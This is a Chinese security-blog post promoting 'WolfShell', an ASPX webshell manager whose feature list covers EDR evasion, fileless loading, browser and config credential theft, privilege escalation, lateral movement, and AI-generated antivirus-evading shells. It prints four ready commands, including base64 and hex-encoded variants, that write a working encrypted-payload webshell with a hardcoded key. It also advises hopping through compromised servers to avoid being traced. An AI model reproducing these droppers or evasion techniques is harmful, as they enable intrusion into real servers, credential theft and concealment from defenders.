---
title: [工具推荐]集成AI渗透的高级WebShell管理工具金刚狼
url: https://mp.weixin.qq.com/s/E6mw8TdfAPOM4HCgrCKv5g
source: Doonsec's feed
date: 2026-04-12
fetch_date: 2026-04-13T04:55:20.985353
---

# [工具推荐]集成AI渗透的高级WebShell管理工具金刚狼

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/MSDUaqtwboS1f6xgNs8bA9tNPLwYZbJqy8KQwtJncynfKAmdxVRicVRN1GgPvMKINdaQPCCSHpPq2PNEa0yiaWS6gr2mCEic6WZCQnweErTkY8/0?wx_fmt=jpeg)

# [工具推荐]集成AI渗透的高级WebShell管理工具金刚狼

0x7556
0x7556

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

## 前言

金刚狼是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、提权、和内网穿透能力。它**集成了大量渗透工具**，**支持内存加载无文件落地操作**，**实现高隐蔽性的内网渗透**。

## 🚀 核心优势

* 支持AI渗透：支持使用自然语言指挥AI操作WebShell执行命令进行渗透。
* 高效隐蔽的通信： 采用 二进制流 传输协议，确保通信的高效性与隐蔽性。
* 端到端安全加密： 所有传输 Payload 均经过 AES加密 保护，且每次通信使用 随机密钥，保障数据安全。
* 无痕运行： 支持直接在 内存中加载并执行代码，最大程度避免在磁盘留下痕迹，显著提升操作隐蔽性和安全性。
* 内网级联WebShell控制： 通过现有已控的WebShell，无需部署代理或配置端口转发，即可连接控制更深层内网环境中的WebShell。
* Hacking后渗透：通过已控的 WebShell 在内存中加载渗透工具，无需部署代理或配置端口转发，即可实现便捷高效的内网横向渗透。
* 语言特征: 服务端(webshell)及payload均为纯英文，只有提供的WebShell变种文件包含英文、日文、韩文。

🔥 功能特性

* **Shell支持**：支持ASPX、ASHX、ASMX、HTTP、TCP、PS1、EXE、DLL（当前仅开放ASPX、ASHX及内存马三种类型）。
* **内存马**：一键注入ASPX内存马，支持任意路径访问，每次均可修改Shell连接地址，有效干扰蓝队分析。
* **Cmd命令执行**：在目标系统上直接执行任意CMD命令，内置魔改版whoami，规避EDR记录与告警。
* **文件管理**：支持目录文件枚举、新建文件、文件上传、EXE执行、重命名、删除及修改文件时间等操作。
* **PowerShell执行**：执行PowerShell代码与命令，集成魔改版whoami，避免EDR监测。
* **Shellcode执行**：在目标环境中直接运行原生Shellcode，可一键上线Cobalt Strike、Metasploit。
* **.NET程序执行**：内存加载执行自定义.NET程序集，快速扩展后渗透能力。
* **内存加载扫描器**：仅需编写单个IP的.NET程序，即可通过该模块实现内存加载的C段扫描。
* **C#代码执行**：动态加载与执行C#代码。
* **ValidationKey提取**：获取ValidationKey、Validation、DecryptionKey等ViewState反序列化信息。
* **web.config读取**：提取数据库连接信息（数据库名、用户、密码）及SMTP/邮件服务器账号密码等。
* **端口转发**：实现本地端口到远程内网主机的映射，便于安全访问内部网络服务。
* **HTTP代理**：一键内存注入Suo5高性能HTTP隧道代理工具。
* **权限提升（Potato系列）**：支持EfsPotato、BadPotato，利用系统服务漏洞提权。
* **内网级联命令执行**：支持级联至内网第二层WebShell执行CMD命令，实现横向移动。
* **内网级联PowerShell执行**：支持级联至内网第二层WebShell执行PowerShell命令，进行横向移动。
* **SshCmd**：SSH远程命令执行工具，支持对内网主机执行命令、文件上传下载，实现横向移动。
* **MysqlCmd**：MySQL数据库连接工具，支持连接内网MySQL，执行查询、导入导出等数据库操作。
* **MssqlCmd**：SQL Server数据库连接工具，支持连接内网数据库，执行查询、导入导出、横向移动、命令执行及Potato提权等。
* **SharpWeb**：浏览器凭据抓取工具，支持提取Chrome、Firefox、Edge中保存的登录信息与凭据。
* **密码读取**：支持IISpwd、wifipwd、FileZillaPwd、firefoxpwd、XshellPwd、GetPwd、FirefoxHistory、FirefoxCookie等。
* **漏洞检测**：集成MS17010、SMBGhost、HikvisionPoc、ActivemqPoc、Struts2Poc、WeblogicPoc、CVE-2022-36537、CVE-2024-47176、CVE-2022-27925、CVE-2024-27956等检测模块。
* **横向工具**：包括wshell、SmbExec、WmiExec、WmiExec2、AtExec、MssqlCmd、MmcExec、ShellExec、ShellBrowserExec等。
* **AI免杀**：接入人工智能，通过对话即可生成免杀WebShell。
* **Ladon**：内网渗透工具集，内存加载无文件落地，涵盖端口扫描、资产探测、密码审计、漏洞检测、漏洞利用、横向移动等功能（工具持续集成中，当前已完成10余种协议资产探测，其余模块暂未支持。与Potato类似，无法集成全部工具，部分功能需使用原程序）。
* **AddUser**：绕过EDR/XDR添加系统用户、管理员、域用户、域管理员。
* **NoPowerShell**：在PowerShell被禁用或不存在的情况下，执行PowerShell命令、代码及文件。

## 辅助功能

### AI人工智能

* AI免杀：接入AI人工智能，聊个天就能免杀WebShell。

### 加密解密

* 支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
* 支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码

## 安装与使用

1. **下载WolfShell**

```
git clone https://github.com/0x7556/wolfshell.git
```

1. **配置环境**

* 确保目标环境支持ASPX、ASHX，并已正确配置。

2. **上传WolfShell**

* 将WolfShell文件上传到目标服务器，支持ASPX、ASHX、内存马3种类型。
* WebShell脚本: https://github.com/0x7556/wolfshell/tree/main/shell

3. **访问WebShell**

* 通过工具客户端连接WebShell，默认密码 WolfShell，修改密码可使用工具上的WolfHash加密。

## 使用环境

* **操作系统：** Windows
* **.NET 版本：** .NET Framework 4.8

## 命令 | 漏洞 GetShell

具备命令执行条件时，可通过以下4种方法写入 金刚狼 WebShell

### PowerShell写入wolf.aspx

```
powershell -Command "Set-Content -Path 'wolf.aspx' -Value '<%@ Page Language=\"C#\" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(\"ca63457538b9b1e0\"); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"K\").Equals(this); }%>'"
```

### PowerShell命令 Base64写入wolf.aspx

```
powershell -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgB3AG8AbABmAC4AYQBzAHAAeAAiACAALQBWAGEAbAB1AGUAIAAnADwAJQBAACAAUABhAGcAZQAgAEwAYQBuAGcAdQBhAGcAZQA9ACIAQwAjACIAIAAlAD4APAAlAGkAZgAgACgAUgBlAHEAdQBlAHMAdAAuAEMAbwBvAGsAaQBlAHMALgBDAG8AdQBuAHQAIAAhAD0AIAAwACkAIAB7ACAAYgB5AHQAZQBbAF0AIABrACAAPQAgAEUAbgBjAG8AZABpAG4AZwAuAEQAZQBmAGEAdQBsAHQALgBHAGUAdABCAHkAdABlAHMAKAAiAGMAYQA2ADMANAA1ADcANQAzADgAYgA5AGIAMQBlADAAIgApADsAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtACAAcwAgAD0AIABSAGUAcQB1AGUAcwB0AC4ASQBuAHAAdQB0AFMAdAByAGUAYQBtADsAIABiAHkAdABlAFsAXQAgAGMAIAA9ACAAbgBlAHcAIABiAHkAdABlAFsAcwAuAEwAZQBuAGcAdABoAF0AOwAgAHMALgBSAGUAYQBkACgAYwAsACAAMAAsACAAYwAuAEwAZQBuAGcAdABoACkAOwAgAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQAuAEwAbwBhAGQAKABuAGUAdwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAAoACkALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoAGsALAAgAGsAKQAuAFQAcgBhAG4AcwBmAG8AcgBtAEYAaQBuAGEAbABCAGwAbwBjAGsAKABjACwAIAAwACwAIABjAC4ATABlAG4AZwB0AGgAKQApAC4AQwByAGUAYQB0AGUASQBuAHMAdABhAG4AYwBlACgAIgBLACIAKQAuAEUAcQB1AGEAbABzACgAdABoAGkAcwApADsAIAB9ACUAPgAnAA==
```

### cmd命令 echo & certutil 写入wolf.aspx

```
echo 3c25402050616765204c616e67756167653d2243232220253e3c2569662028526571756573742e436f6f6b6965732e436f756e7420213d203029207b20627974655b5d206b203d20456e636f64696e672e44656661756c742e476574427974657328223961613337623163323561303834653022293b2053797374656d2e494f2e53747265616d2073203d20526571756573742e496e70757453747265616d3b20627974655b5d2063203d206e657720627974655b732e4c656e6774685d3b20732e5265616428632c20302c20632e4c656e677468293b2053797374656d2e5265666c656374696f6e2e417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528224b22292e457175616c732874686973293b207d253e > w.hex && certutil -f -decodehex w.hex wolf.aspx && del w.hex
```

### cmd命令 echo 写入wolf.aspx

```
echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) { >> wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); >> wolf.aspx && echo System.IO.Stream s = Request.InputStream; >> wolf.aspx && echo byte[] c = new byte[s.Length]; >> wolf.aspx && echo s.Read(c, 0, c.Length); >> wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); >> wolf.aspx && echo } %^> >> wolf.aspx
```

## 功能示例

1. ### 自定义.NET程序执行
2. .NET程序执行： 支持内存加载执行自定义.NET程序集，快速扩展后渗透能力。

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR1wdcEq2KGEgA8w3g6IM78jMicertTW1mfRt2hUduKlCCdwgyyl0piaqA0TUuxhe0gaovY25z0rWO0Wmte7Hic3paNvQ41ictgjU8/640?wx_fmt=png&from=appmsg)

1. ### AI人工智能
2. 使用AI兔杀金刚狼 WebShell 服务端

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSqs6mpZM9IlzSvc4L0g1e6oC6f28yz8XMeUxyJLIJDiakHYLgib55NGEKZTGUicjicpcvpkIFyzvtFtEvxciaHZIDaiapQ8ytMBic6ew/640?wx_fmt=png&from=appmsg)

### 级联内网第3层WebShell 执行Cmd命令

通过入口点 192.168.50.106 级联内网 192.168.50.159 再次级联下一层内网 192.168.50.69 WebShell 执行命令

PS: 当然也可级联外网，比如抓了一些服务器当跳板，真正要搞的目标在第3层，这样就很难被追踪或溯源到你的真实IP了

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRuzvnlaLSibwecPdKAmkMtBTBcKYVWic9k5KibmY6gdiczaGHjUSxkkAwwqHmqs5LicZJKtOVFG65hDDzjOCRiaE949MAv8NzmS8Hak/640?wx_fmt=png&from=appmsg)

### 级联内网第2层WebShell 执行Cmd命令

通过入口点 192.168.50.159 级联内网 192.168.50.106 WebShell执行命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTlNW2jhiabQJ9rOjCdhvPfqfE0jJdlvZEXvPnMbLVCYhFXYV6CF9qk0Yudw3d56ib5p8HKR6yzm2Rb1iagMdSw4NonOm0U8SxFys/640?wx_fmt=png&from=appmsg)

### WebShell入口点 执行Cmd命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSA8MBaC5HsUG1CnMZeMRqmVBErjDVooCORLvQcSEUP6rWOtTicAiaUlTiaJG33Z9d90hwKuND376IT7JOnDkrKFHiaWmExhibGGNP8/640?wx_fmt=png&from=appmsg)

### WebShell入口点 执行PowerShell命令/代码

* whoami代码实现非系统whoami
* 支持命令执行、代码执行 长度9K
* 输入info、ver可查看操作系统版本、位数、.NET版本、PowerShell版本信息
* 输入whoami、username可自动转成对应powershe...